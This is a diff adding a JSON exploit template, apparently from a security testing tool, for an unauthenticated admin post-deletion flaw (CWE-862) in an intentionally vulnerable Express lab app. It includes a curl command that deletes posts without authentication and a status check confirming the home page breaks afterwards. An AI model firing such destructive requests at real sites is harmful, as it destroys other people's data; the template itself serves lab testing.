@@ -1,0 +1,59 @@
+{
+  "templateId": "unauth-post-delete",
+  "attackType": {
+    "name": "broken_access_control",
+    "cwe": "CWE-862"
+  },
+  "dependency": {
+    "runtime": "node",
+    "framework": "express"
+  },
+  "target": {
+    "method": "POST",
+    "endpoint": "/admin/posts/:id/delete",
+    "application": "vul-web2-daehan"
+  },
+  "request": {
+    "curl": "curl -s -X POST '{{origin}}/admin/posts/{{postId}}/delete'"
+  },
+  "blanks": {
+    "origin": {
+      "required": true,
+      "type": "url",
+      "desc": "타겟 origin",
+      "example": "http://127.0.0.1:4101"
+    },
+    "postId": {
+      "required": true,
+      "type": "int",
+      "desc": "삭제할 글 id (대표 공지면 홈이 깨짐)",
+      "example": "1"
+    }
+  },
+  "payloads": [],
+  "verify": {
+    "mode": "statusChain",
+    "steps": [
+      {
+        "method": "GET",
+        "path": "/",
+        "expectStatus": 200
+      },
+      {
+        "method": "POST",
+        "path": "/admin/posts/1/delete",
+        "expectStatus": 302
+      },
+      {
+        "method": "GET",
+        "path": "/",
+        "expectStatus": 500
+      }
+    ]
+  },
+  "executor": "repeater",
+  "mutating": true,
+  "origin": "human_authored",
+  "source": "team",
+  "trust": "confirmed"
+}
